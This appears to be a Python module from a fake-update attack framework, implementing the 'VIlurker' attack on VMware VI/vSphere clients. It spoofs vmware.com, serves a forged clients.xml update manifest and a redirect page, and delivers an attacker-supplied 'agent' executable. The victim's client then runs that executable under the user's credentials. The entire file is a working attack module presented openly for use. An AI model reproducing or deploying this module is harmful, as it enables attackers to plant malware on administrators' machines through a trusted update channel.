from modules import ModuleBase


class VMwareServer(ModuleBase):
    name = 'VMware Server'
    appver = '<= 2.0.0'
    version = '1.0'
    author = ['Claudio Criscione < claudio +[AT]+ criscio.net >']
    description = """VIlurker VIclient attack
        This module performs the VIlurker attack against
        a Virtual Infrastructure or VSphere client.
        The VI client will be tricked into downloading
        a fake update which will be run under the user's credentials.""",
    vh = 'vmware.com' 
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
           'path': '/download/vi/index.html',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://www.vmware.com/vmware<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '/client/clients.xml',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string' : "<ConfigRoot>\r\n<clientConnection id=\"0000\">\r\n<authdPort>902</authdPort>\r\n<version>10</version>\r\n<patchVersion>10.0.0</patchVersion>\r\n<apiVersion>10.0.0</apiVersion>\r\n<downloadUrl>https://*/client/VMware-viclient.exe</downloadUrl>\r\n</clientConnection>\r\n</ConfigRoot>\r\n",
            'parse': 1,
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]